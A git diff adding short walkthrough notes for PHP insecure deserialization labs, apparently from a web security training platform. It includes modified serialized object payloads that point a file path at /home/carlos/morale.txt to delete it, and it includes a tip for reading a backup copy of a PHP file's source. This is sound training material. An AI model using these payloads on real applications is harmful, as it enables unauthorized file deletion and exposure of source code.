@@ -41,3 +41,15 @@ If you have source code access, you should start by looking for unserialize() an
      1. Capture /my-account request and send to repeater and modify the request to /my-account/delete and send
      2. Normal request : O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h74kq9j39tegavxi3d2z9f2p9i3u9avx";s:11:"avatar_link";s:19:"users/wiener/avatar";}
         Modified request : O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h74kq9j39tegavxi3d2z9f2p9i3u9avx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+
+#4 Lab: Arbitrary object injection in PHP
+
+     1. Go to sitemap and from there send CustomTemplate.php to repeater 
+     2. Aftr fil.php add ~ and see the response
+     3. Send /my-account request to repeater and moidfy the centralised object to :-
+        O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+        Normal request : O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pus7qsaoho8lbpds4pq7of0f4fz9jbtn";}
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
